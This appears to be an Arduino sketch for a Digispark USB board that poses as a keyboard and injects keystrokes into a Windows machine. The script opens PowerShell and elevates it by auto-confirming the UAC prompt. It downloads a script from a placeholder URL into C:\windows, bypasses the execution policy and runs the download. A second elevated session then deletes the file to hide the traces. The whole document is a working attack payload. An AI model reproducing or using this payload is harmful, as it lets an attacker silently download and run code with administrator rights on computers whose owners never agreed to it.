#include "DigiKeyboardPtBr.h"

void setup() {
  //empty
}
void loop() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell Start-Process powershell -Verb runAs; exit");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // Alt + Y
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("$url = 'URL HERE';");
  DigiKeyboardPtBr.print("$output='C:\\windows\\script.ps1';");
  DigiKeyboardPtBr.print("Invoke-WebRequest -Uri $url -OutFile $output;");
  DigiKeyboardPtBr.print("Set-ExecutionPolicy Unrestricted -Scope Process -Force;");
  DigiKeyboardPtBr.print("Start-Process -FilePath 'powershell.exe' -ArgumentList \"-ExecutionPolicy Bypass -File $output\"; exit");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell Start-Process powershell -Verb runAs; exit");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // Alt + Y
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("$output='C:\\windows\\script.ps1';");
  DigiKeyboardPtBr.print("Remove-Item $output; exit");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  for (;;) { /*empty*/ }
}